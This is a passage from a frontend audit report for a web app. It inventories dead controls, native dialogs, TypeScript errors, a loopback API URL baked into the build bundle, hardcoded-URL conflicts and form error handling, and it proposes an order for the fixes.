**A.5.3 Dead controls — ≈60 (was "~40"):** of 1411 `<button>`s, **63** have no handler on self/ancestor and aren't submit/disabled → **51 truly dead** + 12 that bubble to a wrong ancestor; **8 dead inputs** + 1 no-op (`Help.tsx:36-41` sets state never read). Worst: Events "Access Pass" `:265`; Ecosystem 3 download/launch tiles `:167,:183,:190`; Help "Send Email"/"Report Issue" `:91,:101`; SettingsModal "Change photo" `:83`; Signup Google `:317`; MessagesSettings session buttons `:2084,:2091,:2109`; MomentDetail comment/share `:177,:184`; Moments "Reply"/"Translate" `:92,:93`. Full 51-site inventory + the 12 bubble cases (e.g. ListingDetail Follow → seller nav) and 8 dead inputs (Clubs/Events/LostFound/StoryViewer ×3 search fields, MarketplaceSettings help search) held in pass-4 report. Misleading-bubble examples: `ListingDetail.tsx:309`, `StoryViewer.tsx:795` (WhatsApp share), `ChatSettingsModal.tsx:518,:1088` (close-handler catches buttons).

**A.5.4 Native dialogs — 140 (was "~60"):** 115 `alert(` + 9 bare `confirm` + 10 `window.confirm` + 2 bare `prompt` + 4 `window.prompt`, across **47 files**. Top: Messages 15, PostCard 11, ChatSettingsModal 11, PostOptionsModal 10, MarketplaceSettingsModal 7, EventsAdmin 7.

**A.5.5 Imports / TS:** `tsc -p tsconfig.app.json` → **927 errors** (TS6133 ×590, TS2339 ×159, …). **TS2307 ×7 — all in `__tests__`** (`fs`/`node:path`/`node:url`; 0 app-code imports of tests) → **zero broken app modules; all lazy chunks resolve**. Build has no type gate (`"build": "vite build"`; `typecheck` separate).

**A.5.6 CRITICAL — env baked into the bundle:** `frontend/.env.local` line 1 `VITE_API_URL=http://127.0.0.1:3000/api` consumed at build time by `api.ts:9`, `tokenRefresh.ts:6`, `imageUtils.ts:5`, `OtaService.ts:9`, `EnvironmentService.ts:16` → verified **5× `127.0.0.1:3000` in `dist/assets/index-B_d5PGUc.js` + `imageUtils-Ce8zcgfk.js`** (dist mtime 2026-10-06). Any deploy of that `dist` points all API traffic at loopback. Socket path unaffected (falls back to `origin`). Line 2 `VITE_SUPABASE_URL=https://placeholder.supabase.co` also baked (client never imported anyway). `.env.local` is gitignored → a **Vercel** build is clean, but every local rebuild re-poisons `dist`. → **P0 #19.** (Prior H5 claim "bundle verified zero localhost:3000" missed it because the value is `127.0.0.1`, not `localhost`.)

**A.5.7 Hardcoded URLs (src):** 0 runtime `localhost`/`127.0.0.1`; 16 `http://` = SVG xmlns only; flag `Invite.tsx:47` fallback `sparkleweb.app.vercel.app` vs QR/share URLs `sparkle.app` (`ChatSettingsModal.tsx:1790,1861,1873`, `SparklePeopleHubModal.tsx:231`) — **domain conflict, one is wrong** (unverified which is canonical); `Ecosystem.tsx:38,49,59` API samples are display strings (docs, not executed).

**A.5.8 Forms (top 10):** validation 8/10 (SellItem + PostModal gate-only); user-visible errors 8/10, of which **4 via native `alert()`**; **`PostDetail` comments (`:69`, catch→logger only `:89`) and `Confessions` comments (`:184`, `:203`) fail silently**; loading/disabled 10/10. Chat composer (`Messages.tsx:2847`) fails via optimistic-bubble timeout → `failed` state + resend (good pattern).

**A.5.9 Old-claim verdicts:** Fake QR scanner **still fake** (`EventsAdmin.tsx:164-195` CSS box). Fake analytics **stale** — `/analytics` hits real `GET /analytics/creator`; the mock component `AnalyticsDashboard.tsx` is now a **dead file** (but `FloatingRewardWidget` still uses `mockStats` live on `/invite`). "Coming soon" screens **still shipped** (`FriendDiscoveryScreen`, `SearchSparkleScreen`, SettingsModal 3/4 tabs, MilestoneTracker). Verified `setTimeout` submit **still fake** (`Verified.tsx:50-57`). Streams mocks/loader **still true**. Notifications mock rows **stale (gone)**. Leaderboard Alice/Bob **dead file (stale)**. `three` chunk **fixed (stale)**. ProfessionalDashboard dead buttons **fixed**. Signup Resend **fixed** (Google not). Help FAQ hover-only **still true**. `/confessions/:id` 404 **stale** (route exists; see A.1 #11).

### A.6 — Fix-order implication (frontend batch, proposed)

1. **P0 #19** (env/dist — deploy blocker) → 2. **P0 #20-22** (XSS, CORS, role claim — small backend+frontend edits) → 3. **P0 #23-26** + §3 still-broken items 3,4,5,6 (structural core: tokens/z-index) → 4. remaining §3 broken/partial → 5. A.3 P2s → 6. Security Mediums → 7. A.5 dead links/controls sweep → 8. P2 structural per §3.
